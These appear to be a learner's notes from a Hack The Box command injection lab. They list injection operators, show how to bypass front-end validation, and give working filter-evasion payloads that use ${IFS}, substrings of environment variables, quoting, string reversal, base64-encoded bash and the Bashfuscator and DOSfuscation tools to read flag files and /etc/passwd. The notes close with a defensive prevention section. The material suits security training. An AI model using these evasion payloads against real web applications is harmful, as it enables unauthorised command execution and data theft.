## Exploitation
#### Detection
```
## Command Injection Detection
- We see a functionality performing pinging.
- E.g. Confident guess of underlying command
ping -c 1 OUR_INPUT

- If something is performing functionality that uses any OS commands.

## Command Injection Methods
- Common Injection Operator:
```

| **Injection Operator** | **Injection Character** | **URL-Encoded Character** | **Executed Command**                       |
| ---------------------- | ----------------------- | ------------------------- | ------------------------------------------ |
| Semicolon              | `;`                     | `%3b`                     | Both                                       |
| New Line               | `\n`                    | `%0a`                     | Both                                       |
| Background             | `&`                     | `%26`                     | Both (second output generally shown first) |
| Pipe                   | `\|`                    | `%7c`                     | Both (only second output is shown)         |
| AND                    | `&&`                    | `%26%26`                  | Both (only if first succeeds)              |
| OR                     | `\|`                    | `%7c%7c`                  | Second (only if first fails)               |
| Sub-Shell              | ` `` `                  | `%60%60`                  | Both (Linux-only)                          |
| Sub-Shell              | `$()`                   | `%24%28%29`               | Both (Linux-only)                          |

```
- Use the command where both commands gets executed.

Tip: In addition to the above, there are a few unix-only operators, that would work on Linux and macOS, but would not work on Windows, such as wrapping our injected command with double backticks (` `` `) or with a sub-shell operator (`$()`).

Note: The only exception may be the semi-colon `;`, which will not work if the command was being executed with `Windows Command Line (CMD)`, but would still work if it was being executed with `Windows PowerShell`.

## Questions
Try adding any of the injection operators after the ip in IP field. What did the error message say (in English)?
"Please match the requested format"
```

#### Injecting Commands
```
## Injecting Our Command
- E.g. OS command code:
ping -c 1 127.0.0.1; whoami

- Testing on our own linux os
21y4d@htb[/htb]$ ping -c 1 127.0.0.1; whoami

- Look at network tab [CTRL + SHIFT +E] to see if there is a response being made to the back end.

## Bypassing Front-End Validation
- Put in passable input and modify if through BURP (adding the payload and using [ctrl + U] for url encoding)

## Questions
Review the HTML source code of the page to find where the front-end input validation is happening. On which line number is it?

- [ctrl + u] then see line 17 there is a regex check.
```

#### Other Injection Operators
```
## AND Operator
- E.g. use of an AND operator command:
ping -c 1 127.0.0.1 && whoami

- Test on our Linux command to ensure that it is working:
21y4d@htb[/htb]$ ping -c 1 127.0.0.1 && whoami

- We can test on burp to see the outpout

## OR Operator
- E.g. of or operator not running command on payload.
21y4d@htb[/htb]$ ping -c 1 127.0.0.1 || whoami

PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.635 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.635/0.635/0.635/0.000 ms

- E.g. of or command working
21y4d@htb[/htb]$ ping -c 1 || whoami

ping: usage error: Destination address required
21y4d

- useful table for injection

## Questions
Try using the remaining three injection operators (new-line, &, |), and see how each works and how the output differs. Which of them only shows the output of the injected command?

- Using burp (with url encoding):
127.0.0.1 \n whoami
127.0.0.1 & whoami
127.0.0.1 | whoami
	-> Only the third one showed output of injection command.
```

## Filter Evasion
#### Identifying Filters
```
## Filter/WAF Detection
- Putting in injections gives an invalid input command or something of the sort.

- If the error message displayed a different page, with information like our IP and our request, this may indicate that it was denied by a WAF

- Checking payload we want:
127.0.0.1; whoami

## Blacklisted characters
- Example code that blacklist characters:
$blacklist = ['&', '|', ';', ...SNIP...];
foreach ($blacklist as $character) {
    if (strpos($_POST['ip'], $character) !== false) {
        echo "Invalid input";
    }
}

## Identifying Blacklisted character
- Reduce request of character one at a time

## Questions
Try all other injection operators to see if any of them is not blacklisted. Which of (new-line, &, |) is not blacklisted by the web application?

- We bypassed client-slide validation througb burp.
	-> Preparing payload: %0a, %26, %7c 

- Use payload when appending (identifying blacklisted charatcer), %0a bypassed filter. 
```

#### Bypassing Space FIlters
```
## Bypass Blacklisted Operators
- The new-line injection character is commonly not blacklisted.

## Bypass Blacklisted Spaces
- E.g. an error discovered in 127.0.0.1%0a+whoami
- Go back to identifying Blacklisted character section and input 127.0.0.1%0a+, we see that it is the space causing the blacklist.

- Using tabs (%09) instead of space is a technique that may work.
	- E.g. 127.0.0.1%0a%09

- Using $IFS (Linux Environment variable) since its default value is a space and a tab and would work between command arguments.
	- E.g. 127.0.0.1%0a${IFS}

- uses Brace Expansion (automatically adds apce)
	- E.g.
areaeric@htb[/htb]$ {ls,-la}

- More choices at payloads of all things
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space

## Questions
Use what you learned in this section to execute the command 'ls -la'. What is the size of the 'index.php' file?\

- Using various techniques taught in ## Bypass Blacklisted Spaces, we have (after using burp):
	-> tabs: ip=127.0.0.1%0a%0a%09{ls,-la}
	-> using IFS ip=127.0.0.1%0a${IFS}ls${IFS}-la
```

#### Bypassing Other Blacklisted Characters
```
## Linux
- Example of getting the / and ; operator, that is very commonly blacklisted:
areaeric@htb[/htb]$ echo ${PATH}

/usr/local/bin:/usr/bin:/bin:/usr/games

areaeric@htb[/htb]$ echo ${PATH:0:1}

/

**Note:** When we use the above command in our payload, we will not add `echo`, as we are only using it in this case to show the outputted character.

areaeric@htb[/htb]$ echo ${LS_COLORS:10:1}

;
	-> The syntax is echo ${LS_COLORS:starting_index:num_of_chars}

## Windows
- It's like in Linux, but instead we deal with \
C:\htb> echo %HOMEPATH:~6,-11%

\

- In powershell:
PS C:\htb> $env:HOMEPATH[0]

\

## Character Shifting
- Shifting character by one character forward ([ is 91, after shifting below becomes 92 is equal to \)
areaeric@htb[/htb]$ man ascii     # \ is on 92, before it is [ on 91
areaeric@htb[/htb]$ echo $(tr '!-}' '"-~'<<<[)


## Work flow:
-> decide on the command you want to execute, and craft it one by one by one out using techniques taught in the section


## Questions
Use what you learned in this section to find name of the user in the '/home' folder. What user did you find?

-> The command we want is:
127.0.0.1\nls /home


; -> ${LS_COLORS:10:1} from ## Linux

space -> ${IFS} from previous section bypassing space

/ -> ${PATH:0:1} from ## Linux

- Combining becomes (using burp and url encoding)
ip=127.0.0.1%0als${IFS}${PATH:0:1}home

-> note:
ping 127.0.0.1${LS_COLORS:10:1} wouldn't quite work because ${LS_COLORS:10:1} acts as an character instead the termination quote that we want it to be.
```

#### Bypassing Blacklisted Commands
```
## Commands Blacklist
- Commands like whoami gets blacklisted.
- PHP code example of performing blacklisted commands:
$blacklist = ['whoami', 'cat', ...SNIP...];
foreach ($blacklist as $word) {
    if (strpos('$_POST['ip']', $word) !== false) {
        echo "Invalid input";
    }
}

## Linux & Windows
- Using ' and " quotes for obfusation:
21y4d@htb[/htb]$ w'h'o'am'i

21y4d

21y4d@htb[/htb]$ w"h"o"am"i

21y4d
	-> using burp showed that it works

## Linux Only
- Using characters like \ and $@
- Note that the number of characters to not have to be even
who$@ami
w\ho\am\i

Exercise: Try the above two examples in your payload, and see if they work in bypassing the command filter. If they do not, this may indicate that you may have used a filtered character. Would you be able to bypass that as well, using the techniques we learned in the previous section?
	-> Unsure, checked htb discord and no one seems to have an answer as well (even to those that have passed CPTS). Will be keeping track of this question. 
	-> but showcases that if you have to execute commands inside a subshell, then it becomes a string rather than envrionment variable and execution doesn't turn out well(?)

## Windows Only
- Use of ^ character
C:\htb> who^ami

21y4d


## Exericses 
Use what you learned in this section find the content of flag.txt in the home folder of the user you previously found.

- The command we want is:
127.0.0.1%0als /home
	-> applying some bypass blacklisted characters: 127.0.0.1%0als${IFS}${PATH:0:1}home
	-> 1nj3c70r
	-> want to list of the user:
127.0.0.1%0als${IFS}${PATH:0:1}home${PATH:0:1}1nj3c70r

-> getting flag, command construction:
cat /home/1nj3c70r/flag.txt
	-> 127.0.0.1%0acat${IFS}${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt

	-> Invalid input, most likely the . , testing for that:
127.0.0.1%0acat${IFS}${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag

	-> Still blocked, maybe its cat that got blocked:
	127.0.0.1%0acat
		-> yup, confirmed cat is blacklisted, use ' to bypass it:
	127.0.0.1%0ac'a't
		-> bypass success.
	-> now putting the payload back:127.0.0.1%0ac'a't${IFS}${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt
	-> got flag
```

#### Advanced Command Obfuscation
```
## Case Manipulatiion
- Manipulating cases of letters to bypass some filters.
- e.g. Case manipulation on a windows machine
PS C:\htb> WhOaMi

21y4d

- E.g. Turning commands into lower cases in Linux
21y4d@htb[/htb]$ $(tr "[A-Z]" "[a-z]"<<<"WhOaMi")

21y4d

- Burp Post Request: Be careful with the command to make sure it does not contain space, use %09 tab instead.

- E.g. Other commands with the same purpose
$(a="WhOaMi";printf %s "${a,,}")

Exercise: Can you test the above command to see if it works on your Linux VM, and then try to avoid using filtered characters to get it working on the web application?
	-> Works on Linux VM: $(a="WhOaMi";printf %s "${a,,}")
	-> Recevied invalid input:
		$(a="WhOaMi";printf${IFS}%s${IFS}"${a,,}")
	-> suspect it's ; , fixed it using new line
$(a="WhOaMi"%0a${IFS}printf${IFS}%s${IFS}"${a,,}")

## Reversed Commands
- Writing reversed command to avoid blacklisting
- E.g. Example bash code:
areaeric@htb[/htb]$ echo 'whoami' | rev
imaohw

- E.g. Execution of original command
21y4d@htb[/htb]$ $(rev<<<'imaohw')
21y4d

- E.g. Burp Post Request: Modify response in burp, insert $(rev<<<'imaohw')

Tip: If you wanted to bypass a character filter with the above method, you'd have to reverse them as well, or include them when reversing the original command.

- E.g. Reversing string in windows:
PS C:\htb> "whoami"[-1..-20] -join ''

- E.g. running a command with reverse string using subshell (iex "$()")
PS C:\htb> iex "$('imaohw'[-1..-20] -join '')"

## Encoced commands
- Technique for filtering character that may be URL-deocded by the server

- E.g. Encoding commands in base64
areaeric@htb[/htb]$ echo -n 'cat /etc/passwd | grep 33' | base64

- E.g. Decode the encoding string in subshell and pass it for execution:
areaeric@htb[/htb]$ bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)

www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin

Tip: Note that we are using `<<<` to avoid using a pipe `|`, which is a filtered character.

- Burp POST Request: Modify the request through burp.

- E.g. Doing the same thing in Windows:
PS C:\htb> [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))

dwBoAG8AYQBtAGkA

- Converting the string from utf-8 to utf-16 before we base64 it if we were using a Linux:
areaeric@htb[/htb]$ echo -n whoami | iconv -f utf-8 -t utf-16le | base64

- E.g. Decode the b64 string and executing it Powershell subshell
PS C:\htb> iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"

21y4d

## Exercises:
- Command we want to execute:
find /usr/share/ | grep root | grep mysql | tail -n 1

-> encoded command seems the most suitable:

-## Encoded commands:
echo -n 'find /usr/share/ | grep root | grep mysql | tail -n 1' | base64
-> ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=

bash<<<$(base64 -d<<<ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=)

	-> Remove the space with ifs:
bash<<<$(base64${IFS}-d<<<ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=)
-> complete flag.
```

#### Evasion Tools
```
## Linux (Bashfuscator)
- using the tool Bashfuscator
areaeric@htb[/htb]$ git clone https://github.com/Bashfuscator/Bashfuscator
areaeric@htb[/htb]$ cd Bashfuscator
areaeric@htb[/htb]$ pip3 install setuptools==65
areaeric@htb[/htb]$ python3 setup.py install --user

areaeric@htb[/htb]$ cd ./bashfuscator/bin/
areaeric@htb[/htb]$ ./bashfuscator -h

- Creating commands:
areaeric@htb[/htb]$ ./bashfuscator -c 'cat /etc/passwd'

- Producing a simpler commands:
areaeric@htb[/htb]$ ./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1

areaeric@htb[/htb]$ bash -c 'eval "$(W0=(w \  t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"'

root:x:0:0:root:/root:/bin/bash
...SNIP...

Exercise: Try testing the above command with our web application, to see if it can successfully bypass the filters. If it does not, can you guess why? And can you make the tool produce a working payload?

## Windows (DOSfuscation)
- Use of tools like DOSfuscation, with an interactive element
PS C:\htb> git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
PS C:\htb> cd Invoke-DOSfuscation
PS C:\htb> Import-Module .\Invoke-DOSfuscation.psd1
PS C:\htb> Invoke-DOSfuscation
Invoke-DOSfuscation> help

HELP MENU :: Available options shown below:
[*]  Tutorial of how to use this tool             TUTORIAL
...SNIP...

Choose one of the below options:
[*] BINARY      Obfuscated binary syntax for cmd.exe & powershell.exe
[*] ENCODING    Environment variable encoding
[*] PAYLOAD     Obfuscated payload via DOSfuscation

Invoke-DOSfuscation> SET COMMAND type C:\Users\htb-student\Desktop\flag.txt
Invoke-DOSfuscation> encoding
Invoke-DOSfuscation\Encoding> 1

- Running the obfuscated command:
C:\htb> typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h%TMP:~-13,-12%b-stu%SystemRoot:~-4,-3%ent%TMP:~-19,-18%%ALLUSERSPROFILE:~-4,-3%esktop\flag.%TMP:~-13,-12%xt

Tip: If we do not have access to a Windows VM, we can run the above code on a Linux VM through `pwsh`. Run `pwsh`, and then follow the exact same command from above. This tool is installed by default in your `Pwnbox` instance. You can also find installation instructions at this [link](https://docs.microsoft.com/en-us/powershell/scripting/install/installing-powershell-core-on-linux).
```

## Command Injection Prevention
```
## Overview
- We should now have a solid understanding of how command injection vulnerabilities occur and how certain mitigations like character and command filters may be bypassed. 
 
	-> This section will discuss methods we can use to prevent command injection vulnerabilities in our web applications and properly configure the webserver to prevent them.

## System Commands

- We should always avoid using functions that execute system commands, especially if we are using user input with them.
	
	-> Even when we are not directly inputting user input into these functions, a user may be able to indirectly influence them, which may eventually lead to a command injection vulnerability.

- Instead of using system command execution functions, we should use built-in functions that perform the needed functionality, as back-end languages usually have secure implementations of these types of functionalities. 
	
	-> For example, suppose we wanted to test whether a particular host is alive with `PHP`.
	
	-> In that case, we may use the `fsockopen` function instead, which should not be exploitable to execute arbitrary system commands.

- If we needed to execute a system command, and no built-in function can be found to perform the same functionality, we should never directly use the user input with these functions but should always validate and sanitize the user input on the back-end.
 
	-> Furthermore, we should try to limit our use of these types of functions as much as possible and only use them when there's no built-in alternative to the functionality we require.

## Input Validation

- Whether using built-in functions or system command execution functions, we should always validate and then sanitize the user input. 
 
	-> Input validation is done to ensure it matches the expected format for the input, such that the request is denied if it does not match. 
	
	-> In our example web application, we saw that there was an attempt at input validation on the front-end, but `input validation should be done both on the front-end and on the back-end`.

- In `PHP`, like many other web development languages, there are built in filters for a variety of standard formats, like emails, URLs, and even IPs, which can be used with the `filter_var` function, as follows:

if (filter_var($_GET['ip'], FILTER_VALIDATE_IP)) {
    // call function
} else {
    // deny request
}

- If we wanted to validate a different non-standard format, then we can use a Regular Expression `regex` with the `preg_match` function. 
 
	-> The same can be achieved with `JavaScript` for both the front-end and back-end (i.e. `NodeJS`), as follows:

if(/^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/.test(ip)){
    // call function
}
else{
    // deny request
}

- Just like `PHP`, with `NodeJS`, we can also use libraries to validate various standard formats, like [is-ip](https://www.npmjs.com/package/is-ip) for example, which we can install with `npm`, and then use the `isIp(ip)` function in our code. 
 
	-> You can read the manuals of other languages, like [.NET](https://learn.microsoft.com/en-us/aspnet/web-pages/overview/ui-layouts-and-themes/validating-user-input-in-aspnet-web-pages-sites) or [Java](https://docs.oracle.com/cd/E13226_01/workshop/docs81/doc/en/workshop/guide/netui/guide/conValidatingUserInput.html?skipReload=true), to find out how to validate user input on each respective language.

## Input Sanitization

- The most critical part for preventing any injection vulnerability is input sanitization, which means removing any non-necessary special characters from the user input. 
 
	-> Input sanitization is always performed after input validation. Even after we validated that the provided user input is in the proper format, we should still perform sanitization and remove any special characters not required for the specific format, as there are cases where input validation may fail (e.g., a bad regex).

- In our example code, we saw that when we were dealing with character and command filters, it was blacklisting certain words and looking for them in the user input.
 
	-> Generally, this is not a good enough approach to preventing injections, and we should use built-in functions to remove any special characters. 
	
	-> We can use `preg_replace` to remove any special characters from the user input, as follows:

$ip = preg_replace('/[^A-Za-z0-9.]/', '', $_GET['ip']);

- As we can see, the above regex only allows alphanumerical characters (`A-Za-z0-9`) and allows a dot character (`.`) as required for IPs. Any other characters will be removed from the string. The same can be done with `JavaScript`, as follows:

var ip = ip.replace(/[^A-Za-z0-9.]/g, '');

- We can also use the DOMPurify library for a `NodeJS` back-end, as follows:

import DOMPurify from 'dompurify';
var ip = DOMPurify.sanitize(ip);

- In certain cases, we may want to allow all special characters (e.g., user comments), then we can use the same `filter_var` function we used with input validation, and use the `escapeshellcmd` filter to escape any special characters, so they cannot cause any injections. 
 
	-> For `NodeJS`, we can simply use the `escape(ip)` function. 
	
	-> `However, as we have seen in this module, escaping special characters is usually not considered a secure practice, as it can often be bypassed through various techniques`.
	-> Advanced patching covered in other modules (source code review)
	
## Server Configuration

Finally, we should make sure that our back-end server is securely configured to reduce the impact in the event that the webserver is compromised. Some of the configurations we may implement are:

	- Use the web server's built-in Web Application Firewall (e.g., in Apache `mod_security`), in addition to an external WAF (e.g. `Cloudflare`, `Fortinet`, `Imperva`..)
	    
	- Abide by the [Principle of Least Privilege (PoLP)](https://en.wikipedia.org/wiki/Principle_of_least_privilege) by running the web server as a low privileged user (e.g. `www-data`)
	    
	- Prevent certain functions from being executed by the web server (e.g., in PHP `disable_functions=system,...`)
	    
	- Limit the scope accessible by the web application to its folder (e.g. in PHP `open_basedir = '/var/www/html'`)
	    
	- Reject double-encoded requests and non-ASCII characters in URLs
	    
	- Avoid the use of sensitive/outdated libraries and modules (e.g. [PHP CGI](https://www.php.net/manual/en/install.unix.commandline.php))
```

## Skills assessment
```
## Scenario
You are contracted to perform a penetration test for a company, and through your pentest, you stumble upon an interesting file manager web application. As file managers tend to execute system commands, you are interested in testing for command injection vulnerabilities.

Use the various techniques presented in this module to detect a command injection vulnerability and then exploit it, evading any filters in place.

-> Upon entering the page, we see the copy action seems to be relevant to executing command (cp)

-> we see both copy and move option may be relevant to command injection, so we test both for injection (;)
	-> In move option, we got a malicious request denied after trying out the fields. 
	-> We inject in the to parameter because of how mv command is structured:
	to=;who'am'i
		-> we got www-data.

- Now we can write the file we want for rce:
to=;cat /flag.txt

-> applying filters:
c'a't${IFS}${PATH:0:1}flag.txt
	-> got flag.
```

## Questions
```
-> Illustrate how we need to think about the underlying commands before attacking, as it makes the exploitation process easier.
```